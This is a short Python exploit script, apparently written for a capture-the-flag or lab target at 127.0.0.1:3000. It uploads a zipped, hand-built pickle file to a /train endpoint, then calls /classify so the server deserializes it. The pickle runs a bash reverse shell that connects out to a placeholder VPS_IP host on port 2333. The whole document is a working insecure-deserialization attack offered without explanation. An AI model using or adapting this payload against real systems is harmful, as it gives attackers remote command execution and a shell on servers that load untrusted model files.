import requests
import zipfile
import io

url = "http://127.0.0.1:3000/"
burp_proxy = {'http':'http://127.0.0.1:8080'}

def upload_pickle_payload():
    data = {'sample_0_type' : '/app/models'}

    pkl_payload = b'''(S'bash -c "bash -i >& /dev/tcp/VPS_IP/2333 0>&1"'
ios
system
.'''

    output_buffer = io.BytesIO()
    with zipfile.ZipFile(output_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr('good.pkl', pkl_payload)
    file = {
        'sample_0' : ('not_important', output_buffer.getvalue(), "application/zip")
    }

    requests.post(url+"/train?model=xxx&sampleCount=1", data=data, files=file, proxies=burp_proxy)

def trigger_pickle_unserial():
    data = {'text' : 'text'}
    requests.post(url+"/classify?modelName=good.pkl", json=data, proxies=burp_proxy)

if __name__ == "__main__":
    upload_pickle_payload()
    trigger_pickle_unserial()